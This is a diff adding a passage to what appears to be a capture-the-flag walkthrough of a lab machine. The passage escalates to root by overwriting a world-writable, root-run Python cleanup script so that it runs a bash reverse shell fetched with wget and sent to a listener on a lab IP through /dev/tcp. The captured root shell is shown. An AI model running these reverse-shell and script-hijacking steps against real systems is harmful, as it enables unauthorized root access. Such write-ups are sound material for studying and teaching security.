@@ -304,8 +304,58 @@ $ ls -l /lib/log/cleaner.py
 -rwxrwxrwx 1 root root 114 Sep 13 05:25 /lib/log/cleaner.py
 ```
 
+the content of this file is :
 
+```python
+#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system('rm -r /tmp/* ')
+except:
+     sys.exit()
+```
 
+it just removes anything in `/tmp` directory, clever, but not too much :)
+
+just change the content of cleaner.py to get a reverse shell, i uploaded a simple reverse shell to /dev/shm directory
+
+and saved as shell.sh
+
+```bash
+root@kali: echo 'bash -i >& /dev/tcp/192.168.127.128/4444 0>&1' > shell.sh
+root@kali: python -m http.server 80
+
+$ cd /dev/shm
+$ wget http://192.168.127.128/shell.sh
+```
+
+change the content of cleaner.py :
+
+```python
+#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system('/bin/bash /dev/shm/shell.sh')
+except:
+     sys.exit()
+```
+
+and wait for the shell on your system listener :
+
+```bash
+root@kali: nc -nvlp 4444
+   
+listening on [any] 4444 ...
+connect to [192.168.127.128] from (UNKNOWN) [192.168.127.141] 34383
+bash: cannot set terminal process group (1841): Inappropriate ioctl for device
+bash: no job control in this shell
+root@troll:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@troll:~# 
+```
 
 
 
